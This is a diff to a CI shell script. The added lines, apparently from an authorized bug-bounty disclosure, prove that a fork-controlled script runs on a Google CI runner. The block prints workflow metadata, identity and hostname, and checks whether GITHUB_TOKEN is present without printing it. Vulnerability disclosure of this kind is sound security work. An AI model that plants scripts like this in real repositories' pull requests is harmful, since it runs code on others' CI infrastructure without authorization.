@@ -13,3 +13,22 @@
 # limitations under the License.
 
 echo "✅ Success"
+
+# --- PoC for Google OSS VRP issue 559494550 (authorized disclosure) ---
+# Demonstrates that `custard` executes this fork-controlled script on the
+# Google CI runner via the workflow_run -> setup-custard -> Run Custard chain.
+# Read-only: prints identity/host/token-presence only. Exfiltrates nothing.
+echo "=== custard RCE PoC (issue 559494550) ==="
+echo "workflow:    ${GITHUB_WORKFLOW}"
+echo "repository:  ${GITHUB_REPOSITORY}"
+echo "event:       ${GITHUB_EVENT_NAME}"
+echo "run id:      ${GITHUB_RUN_ID}"
+echo "actor:       ${GITHUB_ACTOR}"
+echo "cwd:         $(pwd)"
+echo "--- identity ---"
+id
+echo "--- runner host ---"
+hostname
+echo "--- token present? (value not printed) ---"
+env | grep -c '^GITHUB_TOKEN=' | sed 's/^/GITHUB_TOKEN count: /'
+echo "=== end PoC ==="
